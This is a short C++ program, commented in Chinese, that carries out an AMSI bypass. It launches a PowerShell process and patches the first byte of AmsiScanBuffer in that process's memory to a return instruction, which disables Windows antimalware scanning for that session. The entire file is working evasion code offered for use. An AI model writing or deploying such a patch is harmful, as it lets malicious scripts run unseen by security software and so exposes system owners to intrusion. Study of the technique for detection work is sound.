// 实现amsi绕过.cpp : 此文件包含 "main" 函数。程序执行将在此处开始并结束。
//
#include <Windows.h>
#include <iostream>
#include <stdio.h>

int main()
{
	STARTUPINFOA si = { 0 };  //STARTUPINFOA指定创建时进程的主窗口的窗口工作站、桌面、标准句柄和外观。
	PROCESS_INFORMATION pi = { 0 }; //PROCESS_INFORMATION在创建进程时相关的数据结构之一，该结构返回有关新进程及其主线程的信息。
	si.cb = sizeof(si);				//cb结构大小
	CreateProcessA(NULL, (LPSTR)"powershell -NoExit dir", NULL, NULL, NULL, NULL, NULL, NULL, &si, &pi);  
	HMODULE hAmsi = LoadLibraryA("amsi.dll");											
	LPVOID pAmsiScanBuffer = GetProcAddress(hAmsi, "AmsiScanBuffer");
	Sleep(500);
	DWORD oldProtect;
	char patch = 0xc3;
	VirtualProtectEx(pi.hProcess, (LPVOID)pAmsiScanBuffer, 1, PAGE_EXECUTE_READWRITE, &oldProtect);
	WriteProcessMemory(pi.hProcess, (LPVOID)pAmsiScanBuffer, &patch, sizeof(char), NULL);
	VirtualProtectEx(pi.hProcess, (LPVOID)pAmsiScanBuffer, 1, oldProtect, NULL);
	CloseHandle(pi.hProcess);
	CloseHandle(pi.hThread);
	FreeLibrary(hAmsi);
	return 0;
}
